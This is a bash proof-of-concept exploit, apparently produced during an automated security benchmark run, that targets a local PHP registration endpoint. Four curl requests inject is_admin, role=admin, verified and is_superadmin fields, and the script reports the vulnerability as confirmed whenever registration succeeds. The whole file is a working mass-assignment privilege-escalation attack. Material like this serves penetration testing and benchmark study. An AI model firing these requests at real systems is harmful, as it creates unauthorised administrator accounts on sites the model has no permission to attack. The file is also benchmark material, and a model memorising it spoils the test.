#!/bin/bash
# POC: Demonstrates mass assignment vulnerability by registering with admin privileges via is_admin, role, and verified parameters
# Target: ./repo
# Created: 2025-12-02T16:24:58.150Z
# Session: benchmark-XBEN-069-24-miorxjei

# Mass Assignment / Parameter Pollution - Privilege Escalation POC
# This script demonstrates the ability to escalate privileges during registration
# by injecting admin-related parameters that bypass parameter whitelisting

TARGET_URL="http://localhost:8080/api/register.php"

echo "=== Mass Assignment / Parameter Pollution - Privilege Escalation POC ==="
echo ""

# Test 1: Register with is_admin parameter
echo "[*] Test 1: Attempting registration with is_admin=1 parameter"
RESPONSE1=$(curl -s -X POST "$TARGET_URL" \
  -d 'username=isadmintest&password=test123&email=isadmin@test.com&is_admin=1')
echo "Response: $RESPONSE1"

# Check if successful
if echo "$RESPONSE1" | grep -q "success.*true"; then
    echo "[+] Registration successful with is_admin parameter"
    echo "[!] VULNERABILITY CONFIRMED: is_admin parameter accepted without validation"
else
    echo "[-] Registration failed"
fi
echo ""

# Test 2: Register with role=admin parameter
echo "[*] Test 2: Attempting registration with role=admin parameter"
RESPONSE2=$(curl -s -X POST "$TARGET_URL" \
  -d 'username=roletest&password=test123&email=role@test.com&role=admin')
echo "Response: $RESPONSE2"

# Check if successful
if echo "$RESPONSE2" | grep -q "success.*true"; then
    echo "[+] Registration successful with role=admin parameter"
    echo "[!] VULNERABILITY CONFIRMED: role parameter accepted without validation"
else
    echo "[-] Registration failed"
fi
echo ""

# Test 3: Register with verified=1 parameter
echo "[*] Test 3: Attempting registration with verified=1 parameter"
RESPONSE3=$(curl -s -X POST "$TARGET_URL" \
  -d 'username=verifiedtest&password=test123&email=verified@test.com&verified=1')
echo "Response: $RESPONSE3"

# Check if successful
if echo "$RESPONSE3" | grep -q "success.*true"; then
    echo "[+] Registration successful with verified parameter"
    echo "[!] VULNERABILITY CONFIRMED: verified parameter accepted without validation"
else
    echo "[-] Registration failed"
fi
echo ""

# Test 4: Register with multiple privilege escalation parameters combined
echo "[*] Test 4: Attempting registration with combined privilege escalation parameters"
RESPONSE4=$(curl -s -X POST "$TARGET_URL" \
  -d 'username=superadmin&password=test123&email=superadmin@test.com&is_admin=1&role=admin&verified=1&is_superadmin=1')
echo "Response: $RESPONSE4"

# Check if successful
if echo "$RESPONSE4" | grep -q "success.*true"; then
    echo "[+] Registration successful with multiple privilege escalation parameters"
    echo "[!] VULNERABILITY CONFIRMED: Multiple unauthorized parameters accepted"
else
    echo "[-] Registration failed"
fi
echo ""

echo "=== POC Summary ==="
echo "The registration endpoint accepts arbitrary parameters without validation."
echo "This allows attackers to inject administrative flags during account creation."
echo "Mass assignment vulnerability confirmed - privilege escalation possible."